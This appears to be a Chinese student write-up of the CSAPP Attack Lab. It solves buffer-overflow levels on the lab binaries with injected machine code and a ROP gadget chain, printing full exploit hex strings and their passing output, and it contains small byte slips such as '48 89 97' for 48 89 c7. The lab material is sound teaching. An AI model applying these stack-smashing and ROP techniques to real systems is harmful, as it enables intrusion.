# Attack Lab

## 实验介绍

本实验是CSAPP书中3.10.2-3.10.4章节中的内容，主要介绍了缓冲区溢出带来的相关安全问题。并且AttackLab是更新升级版的旧版实验Buffer Lab。实验中包含两个有漏洞的可执行文件：ctarget和rtarget，并且包含一个将输入的十六进制数字转换为ascii字符的函数。

实验的主要部分在试验网站的writeup中给出，在实验的过程中跟随writeup的指引来完成。

## 实验准备

本实验是在Ubuntu22.04虚拟机上运行的，x86-64系统。

执行实验时在运行可执行文件时添加-q参数，不向服务器发送数据。

两个可执行文件都是通过一个名为get_buf()的函数从文件中或者标准输入流中接收字符串并且写入缓冲区中，该函数具有缓冲区溢出漏洞。函数定义如下：

```c
1 unsigned getbuf()
2 {
3 	char buf[BUFFER_SIZE];
4 	Gets(buf);
5 	return 1;
6 }
```



## Part 1：Code-Injection

### Level 1

在Level1中我们不需要为程序注入代码。我们使用字符串作为输入，来让程序执行一个已经存在的进程。

接收参数的函数get_buf（）由一个名为test的函数调用，test函数定义如下：

```c
1 void test()
2 {
3 	int val;
4 	val = getbuf();
5 	printf("No exploit. Getbuf returned 0x%x\n", val);
6 }
```

另外存在一个函数touch1（），我们的任务是构造合适的字符串作为输入，让我们的getbuf函数返回值touch1（）函数而非test函数。

touch1（）函数的定义如下：

```c
1 void touch1()
2 {
3 	vlevel = 1; /* Part of validation protocol */
4 	printf("Touch1!: You called touch1()\n");
5 	validate(1);
6 	exit(0);
7 }
```

我们要做的是将getbuf的返回地址修改为touch1（）的起始地址。首先我们要使用gobjdump将ctarget文件进行反汇编，查找touch1（）函数，函数起始的地址为

```
00000000004017c0 <touch1>:
```

以及我们找到getbuf的汇编代码如下：

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret    
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

可以看到，getbuf函数在栈中开辟了0x28 = 40个字节的空间，因此我们尝试编写一个长度为40+8字节的字符串，前面40字节进行填充，最后的8字节修改为touch1的地址。

将前面的字节全部填充为A的ascii码：0x41。然后在后8字节我们使用**小端序**来将touch1的地址填充，使用hex2raw来转换。将得到的hexinput_1作为参数输入给./ctarget。结果成功调用输出结果如下：

```
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 C0 17 40 00 00 00 00 00 
```

### Level 2

Level 2需要调用的函数是touch2，该函数的代码如下：

```C
1 void touch2(unsigned val)
2 {
3 	vlevel = 2; /* Part of validation protocol */
4 	if (val == cookie) {
5 		printf("Touch2!: You called touch2(0x%.8x)\n", val);
6 		validate(2);
7 		} else {
8 			printf("Misfire: You called touch2(0x%.8x)\n", val);
9 			fail(2);
10 		}
11 		exit(0);
12 }
```

函数对应的汇编代码地址如下：

```
00000000004017ec <touch2>:
```

该函数接受一个unsigned类型的整数，如果该整数的值与cookie值相同，则完成。

由于该函数需要接收参数，因此我们不能够简单的通过地址的跳转来执行该函数，我们要在调用函数前将我们设置的参数保存至%rdi寄存器中，然后跳转至touch2函数，才能进入正确的条件分支。注意在writeup中特别注明不可以使用jmp或者call指令来跳转至touch2，而必须使用ret指令。因此我们的解决思路是：

1. 将缓冲区进行过度写，将getbuf的返回地址覆盖为我们输入的机器代码的起始部分，
2. 然后将在栈中执行我们输入的代码，完成设置参数和跳转指令
3. 跳转至touch2函数

因此我们要构造的字符串结构如下：

1. 为了方便理解，我们将注入的代码放置在缓冲区的头部，因此字符串的第一部分即为我们的**机器代码**
2. 第二部分是填充字节到达40字节
3. 第三部分是8字节的地址值，地址指向缓冲器的起始部分。

接下来的问题是如何构造机器码。机器码中需要设置参数，因此需要一条mov指令，其次不允许使用call和jmp的情况下，我们只能使用ret指令，根据ret指令的特性，我们将要跳转的地址压栈，再执行ret，即跳转至touch2。因为我们设置了机器码在栈顶，所以我们需要直到函数运行时栈顶的地址，这一地址可以由gdb调试查看%rsp指针的值得到，为0x5561DC78。因此机器码及其反汇编结果如下：

```assembly
level2.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	68 ec 17 40 00       	push   $0x4017ec
   5:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
   a:	c3                   	ret    
```

接下来将字符串拼接，中间继续使用0x41填充，结果成功通过。输出结果如下：

```
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:68 EC 17 40 00 BF FA 97 B9 59 C3 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 78 DC 61 55 00 00 00 00 
```

### Level 3

本任务与Level 2有些类似，但是传递的参数是一个字符数组的指针，并且touch3函数中又调用了别的函数。

touch3相关代码如下：

```C
1 /* Compare string to hex represention of unsigned value */
2 int hexmatch(unsigned val, char *sval)
3 {
4 	char cbuf[110];
5 	/* Make position of check string unpredictable */
6 	char *s = cbuf + random() % 100;
7 	sprintf(s, "%.8x", val);
8 	return strncmp(sval, s, 9) == 0;
9 }
7
10
11 void touch3(char *sval)
12 {
13 	vlevel = 3; /* Part of validation protocol */
14 	if (hexmatch(cookie, sval)) {
15 	printf("Touch3!: You called touch3(\"%s\")\n", sval);
16 	validate(3);
17 	} else {
18 	printf("Misfire: You called touch3(\"%s\")\n", sval);
19 	fail(3);
20 	}
21 exit(0);
22 }
```

touch3接收一个字符数组的起始指针，并且在内部条件分支中调用了一个hexmatch函数，该函数将用户的8位十六进制cookie值转换为一个8个元素的字符数组，与我们传入的字符数组比较（包含字符末尾的0），如果相同则返回1，即能够通过。

touch3的汇编代码地址为：

```assembly
00000000004018fa <touch3>:
```

因此我们解题思路如下：

1. 将缓冲区过度写，将getbuf的返回地址覆盖，跳转至缓冲区开头的机器代码
2. 机器代码完成的任务是将字符数组的起始地址保存至%rdi并且使用ret命令跳转
3. 需要将字符串保存在栈中。需要注意的是，touch3函数和hexmatch函数会继续调用栈空间，因此如果将字符串保存在缓冲区中，则很有可能在hexmatch调用时将字符串覆盖。因此需要将字符串保存在test函数的栈帧之中。

exploit code的书写思路与上一任务相仿。反汇编代码如下：

```assembly
level3.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	68 fa 18 40 00       	push   $0x4018fa
   5:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   c:	c3                   	ret    
```

其中将字符串放在了0x5561dca8，也就是返回地址后的字节中。最终结果通过如下：

```
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:68 FA 18 40 00 48 C7 C7 A8 DC 61 55 C3 35 39 62 39 39 37 66 61 00 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 
```

## Part 2：Return-Oriented Programming

在rtarget中，使用了两种保护机制来防止Part1中的code-injection攻击成功，分别是ASLR和不可执行栈。

在Part2中，我们对rtarget使用ROP攻击，在lab给出的libc中找到我们能用的部分。

### ROP攻击介绍

对ROP攻击方法进行一个简单的介绍。由于在比较新的系统中采取了ASLR和不可执行栈，我们的代码注入变得困难，因此我们在发生缓冲区溢出时将我们的控制流重定位到一些库函数中的某一部分，让这些被信任的代码执行来完成我们的目的。而ROP攻击则是专注于那些libc函数中ret指令前的部分。我们希望能够找到一些小的指令恰好在ret前，如mov，lea，push，pop等，我们将其所需要的数据以缓冲区溢出的方式写在栈中，然后谨慎的排列这些gadget的顺序，让其完成一部分后执行ret指令，跳转至下一步。

### Level 2

我们要使用ROP重现Phase2的攻击，也就是说我们要以这种形式重写出与以下代码功能相同的ret链：

```assembly
    pushq   $0x4017ec
    movl    $0x59b997fa, %edi
    ret
```

我们要将参数保存至%rdi寄存器，一个直观的思路是找到直接向%rdi中pop数据的指令来完成，但是lab限定的libc中没有5f这一字节。因此我们观察给定的机器代码，能够使用58，将数据pop至%rax，

```assembly
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	ret    
```

地址为0x4019a7+0x4 = 0x4019ab；

再使用48 89 97将数据从%rax传递至%rdi，

```assembly
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	ret   
```

地址为0x4019a0+0x2 = 0x4019a2；

完成后再跳转至touch2即可。因此我们写入的字符串的前40个字节都是填充字节；返回地址处写58的指令地址，然后58需要pop一个数据，将我们的cookie值放入此处，然后58的指令ret位置为48 89 97 的mov指令，mov指令的ret地址为touch2的地址。注意各个地址均为64位。

因此我们的填充构造完毕，尝试输入，结果成功通过：

```assembly
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
```

### Level 3

最后一关没有成功通过，原因在于不能简单的使用Phase4+Phase3的逻辑来完成实验，因为在实验的前置内容说明了rtarget采用了站布局随机化技术，因此使用gdb来探测栈顶位置然后使用绝对地址来索引的方式是行不通的。因此需要使用fram中给出的add函数，通过栈的相对位置来索引。